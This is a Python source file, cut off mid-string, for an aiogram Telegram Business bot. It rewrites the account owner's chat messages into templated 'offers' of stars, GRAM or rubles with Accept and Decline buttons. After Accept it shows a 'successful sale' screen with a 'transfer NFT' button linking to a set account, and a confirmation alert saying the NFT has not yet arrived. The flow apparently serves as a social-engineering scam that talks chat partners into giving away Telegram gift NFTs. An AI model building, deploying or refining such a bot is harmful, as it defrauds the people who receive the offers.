"""
Каркас Telegram-бота (aiogram 3.x), работающего через Telegram Business (автоматизация чатов).

Команды, которые ВЫ пишете в любом чате (бот правит ваше сообщение):
    .help           -> заменяется на текст справки (задаётся в админке)
    .shab <номер>   -> заменяется на оффер с кнопками (принять / отклонить ...)

Команды бота: /admin (админ-панель, только ADMIN_IDS), /info (как работает бот).

Переменные окружения (секреты в репозиторий не кладём):
    BOT_TOKEN       токен бота (обязательно)
    SUPERADMIN_ID   Telegram ID единственного суперадмина (обязательно)
    ADMIN_IDS       старые ID админов для миграции (необязательно)
    DATABASE_URL    Postgres для хранения данных (рекомендуется на Render; иначе файл data.json)
    WEBHOOK_URL     публичный URL сервиса (на Render берётся из RENDER_EXTERNAL_URL сам)
    WEBHOOK_SECRET  секрет вебхука (необязательно)

Переменные в текстах:
    {v1}  имя (автоматически), жирным + премиум-эмодзи
    {v2}  число из оффера, жирным + премиум-эмодзи
    {v3}  «звёзды» или «GRAM» (текст зависит от языка), жирным + премиум-эмодзи
    {v4}  текст из оффера с гиперссылкой
    {v5}  общая константа (для всех языков)
    {e:ID} премиум-эмодзи по ID в любом месте текста
"""
import asyncio
import hashlib
import html
import json
import logging
import os
import re
import urllib.parse
from pathlib import Path

from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
from aiogram.types import (
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

try:
    from dotenv import load_dotenv

    load_dotenv()
except ImportError:  # python-dotenv не обязателен
    pass

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("bot")

# ───────────────────────────── Настройки ─────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").replace(" ", "").split(",") if x}
# Один главный администратор задаётся через SUPERADMIN_ID. Для совместимости,
# если переменная не задана, используется минимальный ID из старого ADMIN_IDS.
SUPERADMIN_ID = int(os.getenv("SUPERADMIN_ID", "0") or 0) or (min(ADMIN_IDS) if ADMIN_IDS else 0)
DATA_FILE = Path(os.getenv("DATA_FILE", "data.json"))  # хранилище, если DATABASE_URL не задан

# Хранилище в Postgres: офферы и настройки переживают перезапуски (на Render диск эфемерный)
DATABASE_URL = os.getenv("DATABASE_URL", "")

# Webhook. На Render RENDER_EXTERNAL_URL задаётся автоматически; без него (локально) работает polling.
WEBHOOK_BASE = (os.getenv("WEBHOOK_URL") or os.getenv("RENDER_EXTERNAL_URL", "")).rstrip("/")
PORT = int(os.getenv("PORT", "10000"))
WEBHOOK_PATH = "/webhook"
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET") or hashlib.sha256(BOT_TOKEN.encode()).hexdigest()[:48]

# Отключённый предпросмотр для служебных сообщений админки и .help.
# Для экранов оффера с {v4} используется preview_options() ниже.
NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

FALLBACK_EMOJI = "⭐"  # обычный эмодзи-заглушка внутри премиум-эмодзи
MAX_REMEMBERED_MESSAGES = 5000  # сколько сообщений-офферов помнить (для имени на следующих экранах)
# Telegram строит предпросмотр по URL, даже если он задан как гиперссылка в HTML.
# show_above_text размещает карточку ссылки над текстом сообщения.
def preview_options(tpl: dict, screen: str) -> LinkPreviewOptions:
    # Просим Telegram показать карточку только на экранах, где {v4} действительно выводится.
    raw_text = get_block(tpl, SCREENS[screen]) if "SCREENS" in globals() else ""
    url = (tpl.get("v4_url") or "").strip()
    if "{v4}" in raw_text and url.lower().startswith(("https://", "http://")):
        return LinkPreviewOptions(is_disabled=False, url=url, show_above_text=True)
    return LinkPreviewOptions(is_disabled=True)

# Языки постоянных офферов (можно менять/добавлять — пресеты создадутся сами)
LANGS = {"ru": "🇷🇺 Русский", "en": "🇬🇧 English", "es": "zh Китайский"}

# Вариант переменной {v3}
CHOICE_TITLES = {"stars": "звёзды", "gram": "GRAM", "rub": "рубли"}

# Откуда брать имя для {v1}
NAME_MODES = [
    ("sender_first", "отправитель команды · имя"),
    ("sender_username", "отправитель команды · @username"),
    ("sender_full", "отправитель команды · имя и фамилия"),
    ("chat_first", "собеседник в чате · имя"),
    ("chat_username", "собеседник в чате · @username"),
    ("chat_full", "собеседник в чате · имя и фамилия"),
]

# Блоки постоянных офферов: ключ, название в админке, тип
#   html  — текст сообщения с форматированием
#   label — название кнопки
#   alert — текст всплывающего окна
#   plain — простой текст
BLOCKS = [
    ("main_text", "Экран 1 — текст", "html"),
    ("btn_accept", "Экран 1 — кнопка «Принять»", "label"),
    ("btn_reject", "Экран 1 — кнопка «Отклонить»", "label"),
    ("reject_text", "Экран «Отклонено» — текст", "html"),
    ("accept_alert", "Алерт после «Принять»", "alert"),
    ("accepted_text", "Экран 2 (после алерта) — текст", "html"),
    ("btn_link", "Экран 2 — кнопка-ссылка", "label"),
    ("btn_next", "Экран 2 — кнопка «дальше»", "label"),
    ("screen3_text", "Экран 3 — текст", "html"),
    ("btn_link2", "Экран 3 — кнопка-ссылка", "label"),
    ("btn_alert2", "Экран 3 — кнопка с алертом", "label"),
    ("alert2_text", "Алерт 2 — текст", "alert"),
    ("v3_stars", "Переменная {v3} — вариант «звёзды»", "plain"),
    ("v3_gram", "Переменная {v3} — вариант «GRAM»", "plain"),
    ("v3_rub", "Переменная {v3} — вариант «рубли»", "plain"),
]
BLOCK_KIND = {k: kind for k, _, kind in BLOCKS}
BLOCK_TITLE = {k: title for k, title, _ in BLOCKS}
SCREENS = {"main": "main_text", "reject": "reject_text", "accepted": "accepted_text", "s3": "screen3_text"}

DEFAULT_HELP = "<b>Команды</b>\n\n.help — эта справка\n.shab &lt;номер&gt; — вставить оффер"

# Стартовые тексты. Всё это переписывается в админке (🗂 Постоянные офферы).
DEFAULT_PRESETS = {
    "ru": {
        "main_text": "{v1}, вам доступно:\n\n{v2} {v3}\n\n{v4}",
        "btn_accept": "Принять",
        "btn_reject": "Отклонить",
        "reject_text": "❌ {v1}, вы отклонили предложение.",
        "accept_alert": "Вы приняли: {v2} {v3}. Нажмите OK, чтобы продолжить.",
        "accepted_text": "✅ {v1}, предложение принято.\n\n{v4}",
        "btn_link": "Перейти",
        "btn_next": "Далее",
        "screen3_text": "{v4}\n\n{v5}",
        "btn_link2": "Перейти",
        "btn_alert2": "Подробнее",
        "alert2_text": "{v5}",
        "v3_stars": "звёзд",
        "v3_gram": "GRAM",
        "v3_rub": "рублей",
    },
    "en": {
        "main_text": "{v1}, you have:\n\n{v2} {v3}\n\n{v4}",
        "btn_accept": "Accept",
        "btn_reject": "Decline",
        "reject_text": "❌ {v1}, you declined the offer.",
        "accept_alert": "You accepted: {v2} {v3}. Press OK to continue.",
        "accepted_text": "✅ {v1}, offer accepted.\n\n{v4}",
        "btn_link": "Open",
        "btn_next": "Next",
        "screen3_text": "{v4}\n\n{v5}",
        "btn_link2": "Open",
        "btn_alert2": "Details",
        "alert2_text": "{v5}",
        "v3_stars": "stars",
        "v3_gram": "GRAM",
        "v3_rub": "RUB",
    },
    "es": {
        "main_text": "{v1}, tienes:\n\n{v2} {v3}\n\n{v4}",
        "btn_accept": "Aceptar",
        "btn_reject": "Rechazar",
        "reject_text": "❌ {v1}, has rechazado la oferta.",
        "accept_alert": "Has aceptado: {v2} {v3}. Pulsa OK para continuar.",
        "accepted_text": "✅ {v1}, oferta aceptada.\n\n{v4}",
        "btn_link": "Abrir",
        "btn_next": "Siguiente",
        "screen3_text": "{v4}\n\n{v5}",
        "btn_link2": "Abrir",
        "btn_alert2": "Detalles",
        "alert2_text": "{v5}",
        "v3_stars": "estrellas",
        "v3_gram": "GRAM",
        "v3_rub": "RUB",
    },
}

# Постоянные значения для всех языков (редактируются в админке: 🔧 Постоянные значения)
DEFAULT_SETTINGS = {
    "v5_html": "@example",  # переменная {v5} (можно с форматированием и премиум-эмодзи)
    "link_url": "https://t.me/{v5}",  # ссылка кнопок; {v5} подставляется автоматически
    "emoji_v1": "",  # ID премиум-эмодзи после {v1}
    "emoji_v2_stars": "",  # после {v2}, если выбраны «звёзды»
    "emoji_v2_gram": "",  # после {v2}, если выбран «GRAM»
    "emoji_v2_rub": "",  # после {v2}, если выбраны рубли
    "emoji_stars": "",  # после {v3}, если выбраны «звёзды»
    "emoji_gram": "",  # после {v3}, если выбран «GRAM»
    "emoji_rub": "",  # после {v3}, если выбраны рубли
    "name_mode": "sender_first",
}


# ───────────────────────────── Хранилище (JSON) ─────────────────────────────
def new_template(lang: str) -> dict:
    return {
        "lang": lang,
        "amount": "",  # число для {v2}
        "v3_choice": "stars",  # "stars" | "gram" | "rub"
        "v4_text": "",  # текст для {v4}
        "v4_url": "",  # ссылка, в которую превращается {v4}
    }


class Storage:
    def __init__(self, path: Path, database_url: str = ""):
        self.path = path
        self.url = database_url
        self._conn = None
        self.data: dict = {
            "help_html": DEFAULT_HELP,
            "presets": {},
            "settings": {},
            "templates": {},  # "номер" -> оффер
            "connections": {},  # business_connection_id -> {"user_id": ...}
            "business_chats": {},  # username lowercase -> {chat_id, business_connection_id, name}
            "messages": {},  # "chat_id:message_id" -> {"name": ...}
        }
        saved = self._load()
        if saved:
            self.data.update(saved)
        self.data.setdefault("business_chats", {})
        old_settings = self.data.get("settings", {})
        self.data["settings"] = {**DEFAULT_SETTINGS, **old_settings}
        # Совместимость со старым единым эмодзи после {v2}.
        if "emoji_v2" in old_settings:
            self.data["settings"].setdefault("emoji_v2_stars", old_settings["emoji_v2"])
            self.data["settings"].setdefault("emoji_v2_gram", old_settings["emoji_v2"])
        for lang in LANGS:
            preset = self.data["presets"].setdefault(lang, {})
            for key, value in DEFAULT_PRESETS.get(lang, DEFAULT_PRESETS["ru"]).items():
                preset.setdefault(key, value)
        for tpl in self.data["templates"].values():
            for key, value in new_template(tpl.get("lang", "ru")).items():
                tpl.setdefault(key, value)
        self.save()

    def _connect(self):
        import psycopg  # нужен только при заданном DATABASE_URL

        if self._conn is None or self._conn.closed:
            self._conn = psycopg.connect(self.url, autocommit=True)
            # тип JSON (не JSONB) — сохраняет порядок ключей
            self._conn.execute(
                "CREATE TABLE IF NOT EXISTS bot_state (id INT PRIMARY KEY, data JSON NOT NULL)"
            )
        return self._conn

    def _load(self):
        if self.url:
            row = self._connect().execute("SELECT data FROM bot_state WHERE id = 1").fetchone()
            return row[0] if row else None
        if self.path.exists():
            return json.loads(self.path.read_text("utf-8"))
        return None

    def save(self) -> None:
        if self.url:
            from psycopg.types.json import Json

            sql = ("INSERT INTO bot_state (id, data) VALUES (1, %s) "
                   "ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data")
            for attempt in (1, 2):
                try:
                    self._connect().execute(sql, (Json(self.data),))
                    return
                except Exception:  # noqa: BLE001 — соединение могло оборваться, переподключаемся
                    self._conn = None
                    if attempt == 2:
                        raise
        tmp = self.path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self.data, ensure_ascii=False, indent=2), "utf-8")
        tmp.replace(self.path)


db = Storage(DATA_FILE, DATABASE_URL)
# Перенос старой конфигурации: первый/указанный супер-админ, остальные ADMIN_IDS — обычные.
if "admins" not in db.data:
    db.data["admins"] = sorted(ADMIN_IDS - ({SUPERADMIN_ID} if SUPERADMIN_ID else set()))
    db.save()
else:
    db.data["admins"] = [int(x) for x in db.data.get("admins", []) if str(x).isdigit() and int(x) != SUPERADMIN_ID]


def get_admin_ids() -> set[int]:
    ids = {SUPERADMIN_ID} if SUPERADMIN_ID else set()
    ids.update(int(x) for x in db.data.get("admins", []))
    return ids


def is_superadmin(user_id: int | None) -> bool:
    return bool(user_id and SUPERADMIN_ID and user_id == SUPERADMIN_ID)



def get_block(tpl: dict, key: str) -> str:
    return db.data["presets"][tpl["lang"]][key]


def remember(chat_id: int, message_id: int, name: str) -> None:
    """Запоминаем имя для сообщения: на следующих экранах (нажатия кнопок) оно нужно снова."""
    msgs = db.data["messages"]
    msgs[f"{chat_id}:{message_id}"] = {"name": name}
    while len(msgs) > MAX_REMEMBERED_MESSAGES:
        msgs.pop(next(iter(msgs)))
    db.save()


def recall_name(chat_id: int, message_id: int) -> str:
    return db.data["messages"].get(f"{chat_id}:{message_id}", {}).get("name", "")


def pick_name(mode: str, sender, chat) -> str:
    """Имя для {v1}: отправитель команды (владелец аккаунта) или собеседник в чате."""
    who = sender if mode.startswith("sender") else chat
    if who is None:
        return ""
    kind = mode.split("_", 1)[1]
    first = getattr(who, "first_name", None) or ""
    if kind == "username":
        username = getattr(who, "username", None)
        return f"@{username}" if username else first
    if kind == "full":
        return " ".join(p for p in (first, getattr(who, "last_name", None)) if p)
    return first


# ───────────────────────────── Рендер текста ─────────────────────────────
TAG_RE = re.compile(r"<[^>]+>")
VAR_RE = re.compile(r"\{(v[1-5])\}")
EMOJI_RE = re.compile(r"\{e:(\d+)\}")
URL_RE = re.compile(r"^(https?://|tg://)\S+$", re.I)
AMOUNT_RE = re.compile(r"^\d[\d\s.,]*$")


def emoji_tag(emoji_id: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{FALLBACK_EMOJI}</tg-emoji>'


def bold_var(text: str, emoji_id: str) -> str:
    """Жирный текст переменной + в конце один премиум-эмодзи."""
    out = f"<b>{html.escape(text)}</b>"
    return out + (" " + emoji_tag(emoji_id) if emoji_id else "")


def make_vars(tpl: dict, name: str):
    """Возвращает (html-значения, plain-значения) переменных {v1}..{v5}."""
    st = db.data["settings"]
    preset = db.data["presets"][tpl["lang"]]
    choice = tpl["v3_choice"]
    v3_text = preset["v3_" + choice]
    v4_text = tpl.get("v4_text", "")
    if tpl.get("v4_url"):
        v4_html = f'<a href="{html.escape(tpl["v4_url"], quote=True)}">{html.escape(v4_text)}</a>'
    else:
        v4_html = html.escape(v4_text)
    v5 = st["v5_html"]
    html_vars = {
        "v1": bold_var(name or "—", st["emoji_v1"]),
        "v2": bold_var(tpl.get("amount", ""), st.get("emoji_v2_" + choice, st.get("emoji_v2", ""))),
        "v3": bold_var(v3_text, st["emoji_" + choice]),
        "v4": v4_html,
        "v5": v5,
    }
    plain_vars = {
        "v1": name,
        "v2": tpl.get("amount", ""),
        "v3": v3_text,
        "v4": v4_text,
        "v5": html.unescape(TAG_RE.sub("", v5)),
    }
    return html_vars, plain_vars


def render_html(raw: str, variables: dict) -> str:
    """{v1}..{v5} -> значения, {e:ID} -> премиум-эмодзи. Работает с HTML-разметкой."""
    out = VAR_RE.sub(lambda m: variables.get(m.group(1), ""), raw)
    return EMOJI_RE.sub(lambda m: emoji_tag(m.group(1)), out)


def render_plain(raw: str, variables: dict) -> str:
    """Для алертов и кнопок: без разметки и без эмодзи-маркеров."""
    out = VAR_RE.sub(lambda m: variables.get(m.group(1), ""), raw)
    return EMOJI_RE.sub("", out).strip()


def parse_label(raw: str, variables: dict) -> tuple[str, str | None]:
    """Название кнопки + ID премиум-эмодзи (первый {e:ID}), если указан."""
    m = EMOJI_RE.search(raw)
    return render_plain(raw, variables), (m.group(1) if m else None)


def link_url() -> str:
    """Ссылка кнопок. {v5} в ней заменяется на значение переменной 5 —
    так ссылка меняется только вместе с {v5}."""
    st = db.data["settings"]
    v5 = html.unescape(TAG_RE.sub("", st["v5_html"]))
    v5 = EMOJI_RE.sub("", v5).strip().lstrip("@")
    return st["link_url"].replace("{v5}", urllib.parse.quote(v5, safe=""))


def build_screen(n: str, tpl: dict, screen: str, name: str, icons: bool = True):
    """Возвращает (html_текст, клавиатура) для экрана оффера."""
    html_vars, plain_vars = make_vars(tpl, name)

    def btn(key: str, **kw) -> InlineKeyboardButton:
        text, emoji_id = parse_label(get_block(tpl, key), plain_vars)
        extra = {"icon_custom_emoji_id": emoji_id} if (emoji_id and icons) else {}
        return InlineKeyboardButton(text=text or "•", **kw, **extra)

    def link_btn(key: str) -> InlineKeyboardButton:
        return btn(key, url=link_url())

    rows = None
    if screen == "main":
        rows = [[btn("btn_accept", callback_data=f"sh:{n}:acc"),
                 btn("btn_reject", callback_data=f"sh:{n}:rej")]]
    elif screen == "accepted":
        rows = [[link_btn("btn_link")], [btn("btn_next", callback_data=f"sh:{n}:s3")]]
    elif screen == "s3":
        rows = [[link_btn("btn_link2")], [btn("btn_alert2", callback_data=f"sh:{n}:al2")]]

    text = render_html(get_block(tpl, SCREENS[screen]), html_vars)
    markup = InlineKeyboardMarkup(inline_keyboard=rows) if rows else None
    return text, markup


def alert_text(tpl: dict, key: str, name: str) -> str:
    _, plain_vars = make_vars(tpl, name)
    return render_plain(get_block(tpl, key), plain_vars)[:200]


async def edit_screen(bot: Bot, *, chat_id: int, message_id: int, bcids: list,
                      n: str, tpl: dict, screen: str, name: str) -> None:
    """Правит сообщение (в бизнес-чате или обычном). Если Telegram не принял иконки
    премиум-эмодзи на кнопках — повторяет без них."""
    last_error = None
    for bcid in bcids:
        for icons in (True, False):
            text, markup = build_screen(n, tpl, screen, name, icons)
            try:
                await bot.edit_message_text(
                    text=text, chat_id=chat_id, message_id=message_id,
                    business_connection_id=bcid, parse_mode=ParseMode.HTML,
                    link_preview_options=preview_options(tpl, screen), reply_markup=markup,
                )
                return
            except TelegramBadRequest as e:
                if "message is not modified" in str(e):
                    return
                last_error = e
                log.warning("edit failed (bcid=%s, icons=%s): %s", bcid, icons, e)
    raise last_error


async def send_screen(bot: Bot, chat_id: int, n: str, tpl: dict, name: str,
                      screen: str = "main", business_connection_id: str | None = None):
    for icons in (True, False):
        text, markup = build_screen(n, tpl, screen, name, icons)
        try:
            return await bot.send_message(
                chat_id, text, business_connection_id=business_connection_id,
                parse_mode=ParseMode.HTML,
                link_preview_options=preview_options(tpl, screen), reply_markup=markup,
            )
        except TelegramBadRequest as e:
            if not icons:
                raise
            log.warning("send with icons failed: %s", e)


# ───────────────────────────── /info ─────────────────────────────
INFO_TEXT = (
    "ℹ️ <b>Как работает бот</b>\n\n"
    "Бот подключается к вашему аккаунту через Telegram Business "
    "(Настройки → Telegram для бизнеса → Чат-боты) и умеет править ваши сообщения в любых чатах.\n\n"
    "<b>Команды в чатах</b> (пишете вы, бот заменяет сообщение):\n"
    "• <code>.help</code> — справка\n"
    "• <code>.shab номер</code> — отправляет оффер под нужным номером\n"
    "<b>Как идёт оффер</b>\n"
    "1. Оффер и кнопки «Принять» / «Отклонить».\n"
    "2. «Отклонить» → сообщение меняется на экран отказа.\n"
    
    "3. «Принять» → всплывающее уведомление с кнопкой OK, затем экран об успешной продаже с кнопкой «Передать нфт» и кнопкой «Как передать?».\n"
    "4. «Как передать?» → экран с инструкцией, с кнопкой «Передать нфт» и кнопкой «Подтвердить передачу», которая показывает уведомление, что нфт ещё не передан.\n\n"

    
    "<b>Язык</b>: у каждого оффера свой язык (ru / en / sh) — от него зависят все тексты кнопок и экранов."
)

INFO_ADMIN = (
    "\n\n<b>Админ-панель</b> — /admin\n"
    "• 📖 Сообщение .help\n"
    "• 🧩 Офферы — создаёте номер: язык, сумма, звёзды/GRAM/рубли, название нфт и ссылка на подарок\n"
)


def info_text(is_admin: bool) -> str:
    return INFO_TEXT + (INFO_ADMIN if is_admin else "")


# ───────────────────────────── Business: .help и .shab ─────────────────────────────
public = Router()
SHAB_RE = re.compile(r"^\.shab\s+(\d+)\s*$", re.I)
CONF_RE = re.compile(r"^\+conf\s+(\d+)\s*$", re.I)


async def get_owner_id(bot: Bot, bcid: str) -> int:
    conn = db.data["connections"].get(bcid)
    if conn:
        return conn["user_id"]
    c = await bot.get_business_connection(bcid)
    db.data["connections"][bcid] = {"user_id": c.user.id, "enabled": c.is_enabled}
    db.save()
    return c.user.id


async def notify_admins(bot: Bot, text: str) -> None:
    for admin_id in get_admin_ids():
        try:
            await bot.send_message(admin_id, text)
        except Exception:  # noqa: BLE001
            pass


@public.business_connection()
async def on_business_connection(conn: BusinessConnection, bot: Bot):
    # rights.can_reply — актуальное поле Bot API; can_reply на верхнем уровне устарело.
    rights = getattr(conn, "rights", None)
    can_reply = getattr(rights, "can_reply", None) if rights else getattr(conn, "can_reply", None)
    db.data["connections"][conn.id] = {
        "user_id": conn.user.id,
        "name": conn.user.full_name,
        "enabled": conn.is_enabled,
        "can_reply": can_reply,
    }
    db.save()
    state = "подключён" if conn.is_enabled else "отключён"
    await notify_admins(
        bot,
        f"🔌 Бизнес-аккаунт {html.escape(conn.user.full_name)} {state}. "
        f"can_reply={can_reply}; rights.can_reply={getattr(rights, 'can_reply', None) if rights else None}"
    )


@public.business_message()
async def on_business_message(message: Message, bot: Bot):
    # Запоминаем username и chat_id из обновлений Business, чтобы позже можно было
    # адресно отправить экран 1 по username. Искать произвольные username Telegram не даёт.
    bcid = message.business_connection_id
    if bcid and message.chat.type == "private":
        username = getattr(message.chat, "username", None)
        if username:
            db.data.setdefault("business_chats", {})[f"{bcid}:{username.lower()}"] = {
                "username": username.lower(),
                "chat_id": message.chat.id,
                "business_connection_id": bcid,
                "name": (" ".join(p for p in (
                    getattr(message.chat, "first_name", None),
                    getattr(message.chat, "last_name", None),
                ) if p) or ("@" + username)),
            }
            db.save()
    if not message.text:
        return
    text = message.text.strip()
    low = text.lower()
    conf_match = CONF_RE.match(text)
    # Диагностика: фиксируем только команды, чтобы не засорять лог обычной перепиской.
    if low == ".help" or low.startswith(".shab") or conf_match:
        log.info(
            "Business command received: text=%r chat_id=%s message_id=%s bcid=%s "
            "from_user_id=%s chat_type=%s",
            text, message.chat.id, message.message_id, message.business_connection_id,
            message.from_user.id if message.from_user else None, message.chat.type,
        )
    else:
        return
    # реагируем только на сообщения самого владельца бизнес-аккаунта
    owner_id = await get_owner_id(bot, message.business_connection_id)
    sender_id = message.from_user.id if message.from_user else None
    if sender_id != owner_id:
        log.warning(
            "Business command ignored: sender_id=%s owner_id=%s bcid=%s text=%r",
            sender_id, owner_id, message.business_connection_id, text,
        )
        return
    log.info("Business command owner check passed: owner_id=%s bcid=%s", owner_id, message.business_connection_id)

    bcid = message.business_connection_id
    if low == ".help":
        await bot.edit_message_text(
            text=render_html(db.data["help_html"], {}), chat_id=message.chat.id,
            message_id=message.message_id, business_connection_id=bcid,
            parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW,
        )
        return

    m = SHAB_RE.match(text)
    if not m and not conf_match:
        log.warning("Business command syntax did not match: text=%r bcid=%s", text, bcid)
        return
    n = str(int((m or conf_match).group(1)))
    tpl = db.data["templates"].get(n)
    if not tpl:
        log.error("Business command template missing: n=%s available=%s", n, list(db.data["templates"].keys()))
        command = "+conf" if conf_match else ".shab"
        await notify_admins(bot, f"⚠️ Оффер №{n} не найден (команда {command} {n}).")
        return
    name = pick_name(db.data["settings"]["name_mode"], message.from_user, message.chat)
    remember(message.chat.id, message.message_id, name)
    if conf_match:
        # Промежуточное сообщение: экран 1 появится только после нажатия «Продолжить».
        markup = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Продолжить", callback_data=f"cf:{n}")
        ]])
        await bot.edit_message_text(
            text=".", chat_id=message.chat.id, message_id=message.message_id,
            business_connection_id=bcid, parse_mode=ParseMode.HTML,
            link_preview_options=NO_PREVIEW, reply_markup=markup,
        )
        return
    try:
        await edit_screen(
            bot, chat_id=message.chat.id, message_id=message.message_id,
            bcids=[bcid], n=n, tpl=tpl, screen="main", name=name,
        )
        return
    except Exception as edit_exc:  # noqa: BLE001 — не оставляем ошибку без диагностики
        log.exception(
            "Не удалось заменить .shab на экран: chat_id=%s message_id=%s bcid=%s",
            message.chat.id, message.message_id, bcid,
        )

    # Если исходное сообщение нельзя редактировать, пробуем отправить экран отдельным сообщением.
    # Если Telegram запрещает и отправку, это будет видно в логах и администратору.
    try:
        sent = await send_screen(
            bot, message.chat.id, n, tpl, name,
            screen="main", business_connection_id=bcid,
        )
        remember(sent.chat.id, sent.message_id, name)
        log.info("Экран отправлен отдельным сообщением: chat_id=%s bcid=%s", message.chat.id, bcid)
    except Exception as send_exc:  # noqa: BLE001
        log.exception(
            "Не удалось и отредактировать, и отправить экран: chat_id=%s bcid=%s",
            message.chat.id, bcid,
        )
        await notify_admins(
            bot,
            "❌ Не удалось показать экран .shab.\n"
            f"chat_id={message.chat.id}; business_connection_id={bcid}\n"
            f"Ошибка редактирования: {str(edit_exc)[:700]}\n"
            f"Ошибка отправки: {str(send_exc)[:700]}\n\n"
            "Проверьте права Telegram Business и доступность чата: у Business-бота "
            "должно быть право отвечать в этом чате (обычно чат должен быть активен по входящему "
            "сообщению пользователя в последние 24 часа). Сам факт отсутствия пользователя в контактах "
            "не является отдельным универсальным запретом."
        )


@public.callback_query(F.data.startswith("cf:"))
async def on_conf_callback(cq: CallbackQuery, bot: Bot):
    """Кнопка «Продолжить» из +conf №: открывает экран 1 оффера в том же Business-чате."""
    try:
        n = str(int(cq.data.split(":", 1)[1]))
    except (ValueError, IndexError):
        return await cq.answer("Некорректный номер оффера", show_alert=True)
    tpl = db.data["templates"].get(n)
    msg = cq.message
    if not tpl or not msg:
        return await cq.answer("Оффер не найден", show_alert=True)
    bcid = getattr(msg, "business_connection_id", None)
    if not bcid:
        return await cq.answer("Не найдено Business-подключение для этого сообщения", show_alert=True)
    name = recall_name(msg.chat.id, msg.message_id)
    try:
        await edit_screen(bot, chat_id=msg.chat.id, message_id=msg.message_id,
                          bcids=[bcid], n=n, tpl=tpl, screen="main", name=name)
        await cq.answer()
    except Exception:  # noqa: BLE001
        log.exception("Не удалось открыть экран 1 по +conf для оффера %s", n)
        await cq.answer("Не удалось открыть экран 1", show_alert=True)


@public.callback_query(F.data.startswith("sh:"))
async def on_shab_callback(cq: CallbackQuery, bot: Bot):
    try:
        _, n, action = cq.data.split(":")
    except ValueError:
        return await cq.answer()
    tpl = db.data["templates"].get(n)
    msg = cq.message
    if not tpl or not msg:
        return await cq.answer("Оффер не найден", show_alert=True)

    bcid = getattr(msg, "business_connection_id", None)
    # если у сообщения нет business_connection_id — пробуем обычное редактирование,
    # затем известные бизнес-подключения
    bcids = [bcid] if bcid else [None, *db.data["connections"]]
    name = recall_name(msg.chat.id, msg.message_id)

    async def go(screen: str):
        await edit_screen(bot, chat_id=msg.chat.id, message_id=msg.message_id,
                          bcids=bcids, n=n, tpl=tpl, screen=screen, name=name)

    try:
        if action == "rej":
            await go("reject")
            await cq.answer()
        elif action == "acc":
            # Сначала меняем экран; затем отвечаем на callback, чтобы ошибка редактирования
            # не оставляла кнопку в бесконечной загрузке.
            await go("accepted")
            await cq.answer(alert_text(tpl, "accept_alert", name) or None, show_alert=True)
        elif action == "s3":
            await go("s3")
            await cq.answer()
        elif action == "al2":
            await cq.answer(alert_text(tpl, "alert2_text", name) or None, show_alert=True)
        else:
            await cq.answer()
    except Exception as exc:  # noqa: BLE001
        log.exception(
            "Ошибка callback sh: chat_id=%s message_id=%s bcid=%s action=%s",
            msg.chat.id, msg.message_id, bcid, action,
        )
        try:
            await cq.answer("Telegram не разрешил изменить сообщение. Проверьте права Business.", show_alert=True)
        except Exception:
            pass


@public.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("Бот работает через Telegram Business. Как это устроено — /info")


@public.message(Command("info"))
async def cmd_info_public(message: Message):
    await message.answer(info_text(False))


# ───────────────────────────── Админ-панель ─────────────────────────────
admin = Router()
admin.message.filter(F.chat.type == "private", F.from_user.id.func(lambda uid: uid in get_admin_ids()))
admin.callback_query.filter(F.from_user.id.func(lambda uid: uid in get_admin_ids()))


class AdminCallbackPermissions(BaseMiddleware):
    """Обычным админам разрешены только создание офферов и настройка {v5}/ссылки."""
    async def __call__(self, handler, event, data):
        user = getattr(event, "from_user", None)
        if user and is_superadmin(user.id):
            return await handler(event, data)
        payload = getattr(event, "data", "") or ""
        allowed = (
            payload in {"a:menu", "a:tpls", "a:new", "a:set", "s:e:v5_html", "s:e:link_url"}
            or re.fullmatch(r"t:\d+(?::(?:card|prev|del|delok))?", payload)
            or re.fullmatch(r"a:wlang:(ru|en|es)", payload)
            or re.fullmatch(r"a:wchoice:(stars|gram|rub)", payload)
        )
        if not allowed:
            if hasattr(event, "answer"):
                await event.answer("Недостаточно прав. Доступ ограничен созданием офферов и настройками {v5}/ссылки.", show_alert=True)
            return None
        return await handler(event, data)


admin.callback_query.middleware(AdminCallbackPermissions())


class S(StatesGroup):
    value = State()  # ждём значение; data: target, key
    wiz = State()  # мастер создания оффера; data: i, draft
    admin_add = State()  # супер-админ вводит Telegram ID нового админа


def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=d) for t, d in row] for row in rows
    ])


MAIN_KB = kb(
    [("📖 Сообщение .help", "a:help")],
    [("🧩 Офферы (.shab)", "a:tpls")],
    [("📝 Тексты и кнопки", "a:pres")],
    [("⚙️ Настройки", "a:set")],
    [("❓ Синтаксис", "a:syntax")],
    [("👑 Управление админами", "a:admins")],
)
USER_MAIN_KB = kb(
    [("🧩 Создать оффер", "a:tpls")],
    [("🔧 Изменить юзернейм и ссылки кнопок", "a:set")],
)


def main_kb_for(user_id: int) -> InlineKeyboardMarkup:
    return MAIN_KB if is_superadmin(user_id) else USER_MAIN_KB

SYNTAX_TEXT = (
    "❓ <b>Синтаксис</b>\n\n"
    "• <b>Форматирование</b>: отправляйте боту сообщение с жирным, курсивом, ссылками, "
    "спойлерами, цитатами — всё сохранится.\n"
    "• <b>Премиум-эмодзи</b>: <code>{e:ID}</code> в любом месте текста (или вставьте сам "
